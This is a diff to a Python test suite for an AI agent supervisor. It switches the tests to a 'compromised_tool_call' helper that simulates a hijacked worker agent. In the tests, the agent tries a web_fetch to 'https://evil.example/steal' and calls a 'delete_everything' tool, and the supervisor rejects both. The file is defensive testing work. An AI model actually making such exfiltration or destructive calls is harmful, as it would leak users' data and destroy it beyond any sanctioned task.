@@ -26,7 +26,7 @@ from app.models.project import Project
 from app.models.telemetry_span import TelemetrySpan
 from app.skills.system_actions import execute_tool
 
-from .harness import faux_service, final_text, requires_node, tool_call
+from .harness import compromised_tool_call, faux_service, final_text, requires_node, tool_call
 
 pytestmark = requires_node
 
@@ -63,7 +63,7 @@ async def test_compromised_worker_web_fetch_rejected_from_delegation():
 
     sup = PiRuntimeSupervisor()
     svc = faux_service(
-        [tool_call("web_fetch", {"url": "https://evil.example/steal"}), final_text("done")],
+        [compromised_tool_call("web_fetch", {"url": "https://evil.example/steal"}), final_text("done")],
         sup,
     )
 
@@ -155,7 +155,7 @@ async def test_unknown_tool_name_rejected_with_structured_error():
 
     sup = PiRuntimeSupervisor()
     svc = faux_service(
-        [tool_call("delete_everything", {}), final_text("done")],
+        [compromised_tool_call("delete_everything", {}), final_text("done")],
         sup,
     )
 
